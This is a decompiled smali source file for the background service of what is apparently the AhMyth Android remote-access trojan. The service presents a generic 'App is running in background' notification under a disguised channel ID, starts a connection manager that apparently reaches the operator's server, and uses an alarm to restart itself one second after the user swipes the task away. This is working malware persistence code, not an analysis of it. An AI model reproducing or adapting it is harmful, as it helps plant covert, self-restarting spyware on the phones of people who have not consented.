.class public Lahmyth/mine/king/ahmyth/services/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field static final synthetic $assertionsDisabled:Z

.field static appContext:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    .line 22
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 60
    sget-object v0, Lahmyth/mine/king/ahmyth/services/MainService;->appContext:Landroid/content/Context;

    return-object v0
.end method

.method private startMyOwnForeground()V
    .locals 8

    .line 70
    const-string v0, "com.play.service.techno"

    .line 71
    .local v0, "NOTIFICATION_CHANNEL_ID":Ljava/lang/String;
    const-string v1, "My Background Service"

    .line 73
    .local v1, "channelName":Ljava/lang/String;
    new-instance v2, Landroid/app/NotificationChannel;

    const/4 v3, 0x0

    invoke-direct {v2, v0, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 74
    .local v2, "chan":Landroid/app/NotificationChannel;
    const v4, -0xffff01

    invoke-virtual {v2, v4}, Landroid/app/NotificationChannel;->setLightColor(I)V

    .line 75
    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 77
    const-string v3, "notification"

    invoke-virtual {p0, v3}, Lahmyth/mine/king/ahmyth/services/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/NotificationManager;

    .line 78
    .local v3, "manager":Landroid/app/NotificationManager;
    if-eqz v3, :cond_0

    .line 79
    invoke-virtual {v3, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 81
    new-instance v4, Landroidx/core/app/NotificationCompat$Builder;

    invoke-direct {v4, p0, v0}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 83
    .local v4, "notificationBuilder":Landroidx/core/app/NotificationCompat$Builder;
    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v6

    .line 84
    const-string v7, "App is running in background"

    invoke-virtual {v6, v7}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v6

    .line 85
    invoke-virtual {v6, v5}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v6

    .line 86
    const-string v7, "service"

    invoke-virtual {v6, v7}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v6

    .line 87
    invoke-virtual {v6}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v6

    .line 89
    .local v6, "notification":Landroid/app/Notification;
    invoke-virtual {p0, v5, v6}, Lahmyth/mine/king/ahmyth/services/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 90
    return-void

    .line 78
    .end local v4    # "notificationBuilder":Landroidx/core/app/NotificationCompat$Builder;
    .end local v6    # "notification":Landroid/app/Notification;
    :cond_0
    new-instance v4, Ljava/lang/AssertionError;

    invoke-direct {v4}, Ljava/lang/AssertionError;-><init>()V

    throw v4
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 29
    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 35
    sput-object p0, Lahmyth/mine/king/ahmyth/services/MainService;->appContext:Landroid/content/Context;

    .line 37
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 38
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/services/MainService;->startMyOwnForeground()V

    .line 41
    :cond_0
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/config/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 43
    const/4 v0, 0x1

    return v0
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 7
    .param p1, "rootIntent"    # Landroid/content/Intent;

    .line 49
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/services/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 50
    .local v0, "restartServiceIntent":Landroid/content/Intent;
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/services/MainService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 52
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/services/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x1

    const/high16 v3, 0x40000000    # 2.0f

    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 53
    .local v1, "restartServicePendingIntent":Landroid/app/PendingIntent;
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/services/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "alarm"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/AlarmManager;

    .line 54
    .local v2, "alarmService":Landroid/app/AlarmManager;
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v3

    const-wide/16 v5, 0x3e8

    add-long/2addr v3, v5

    const/4 v5, 0x3

    invoke-virtual {v2, v5, v3, v4, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 56
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 57
    return-void
.end method
